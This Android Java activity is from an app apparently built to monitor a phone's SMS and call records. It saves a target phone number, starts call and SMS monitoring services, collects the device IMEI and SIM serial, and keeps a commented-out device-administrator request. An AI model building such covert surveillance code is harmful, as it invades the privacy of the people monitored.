package com.privacy.monitor.ui;

import com.privacy.monitor.R;
import com.privacy.monitor.base.BaseActivity;
import com.privacy.monitor.base.C;
import com.privacy.monitor.receiver.DeviceAdminReceiver;
import com.privacy.monitor.receiver.MyAppWidgetReceiver;
import com.privacy.monitor.service.CallMonitoringService;
import com.privacy.monitor.service.SMSMonitoringService;
import com.privacy.monitor.util.AppUtil;

import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.appwidget.AppWidgetManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.RemoteViews;
import android.widget.Toast;

/**
 * 短信、通话记录
 */
public class MonitorActivity extends BaseActivity implements OnClickListener{

	private EditText etPhone ;
	private SharedPreferences sp;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.write_phone);
		
		Button btn = getView(R.id.left);
		btn.setOnClickListener(this);
		
		etPhone = getView(R.id.et_phone);
		
		Button savePhone = getView(R.id.save_phone);
		savePhone.setOnClickListener(this);
		sp = getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
		
		/* // 申请权限
		   ComponentName componentName = new ComponentName(this, DeviceAdminReceiver.class);
		   // 设备安全管理服务    2.2之前的版本是没有对外暴露的 只能通过反射技术获取  
		   DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
		   // 判断该组件是否有系统管理员的权限
		    boolean isAdminActive = devicePolicyManager.isAdminActive(componentName);
		    if(!isAdminActive) {
		      Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
		      intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
		      intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "（自定义区域2）");
		      startActivityForResult(intent, 20);
		    }*/
	}

	@Override
	public void onClick(View v) {
		switch(v.getId()){
		case R.id.left:
			this.finish();
			break;
		case R.id.save_phone:
			String phone = etPhone.getText().toString();
			if(TextUtils.isEmpty(phone) || phone.length()!=11){
				Toast.makeText(this,"请输入正确的手机号",Toast.LENGTH_SHORT).show();
				break;
			}
			
			Editor editor = sp.edit();
			editor.putString(C.PHONE_NUM,phone);
	        editor.commit();
	        
	        Intent intent2 = new Intent(this,CallMonitoringService.class);
	        this.startService(intent2);
			
	        Intent intent3 = new Intent(this,SMSMonitoringService.class);
	        this.startService(intent3);
	        
	        AppWidgetManager appWidgetManager = AppWidgetManager.getInstance(getApplicationContext());
			RemoteViews views = new RemoteViews(getPackageName(),R.layout.app_widget_info);
			
			Intent intent = new Intent(Settings.ACTION_QUICK_LAUNCH_SETTINGS);
			PendingIntent pendingIntent = PendingIntent.getActivity(getApplicationContext(), 100, intent, PendingIntent.FLAG_UPDATE_CURRENT);
			views.setOnClickPendingIntent(R.id.open_btn, pendingIntent);
			ComponentName provider = new ComponentName(getApplicationContext(), MyAppWidgetReceiver.class);
			appWidgetManager.updateAppWidget(provider, views);
	        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
			
			String deviceID = sp.getString(C.DEVICE_ID,"");
			String simID = sp.getString(C.SIM_ID,"");
			
			if(TextUtils.isEmpty(deviceID)|| TextUtils.isEmpty(simID)){
				Editor editor2 = sp.edit();
				editor2.putString(C.DEVICE_ID, tm.getDeviceId());
				editor2.putString(C.SIM_ID,tm.getSimSerialNumber());
				editor2.putString(C.DEVICE_BRAND,android.os.Build.BRAND + " " + android.os.Build.MODEL);
				editor2.putString(C.DEVICE_SYSTEM,android.os.Build.VERSION.RELEASE);
				editor2.putString(C.DEVICE_SUP_GPS,AppUtil.hasGPSDevice(getApplicationContext()) ? 1+"" :0+"" );
				editor2.putString(C.DEVICE_SUP_REC,"1");
				editor2.putString(C.DEVICE_SUP_CALL_REC,"1");
				editor2.commit();
			}
	        this.finish();
			break;
		}
	}
}
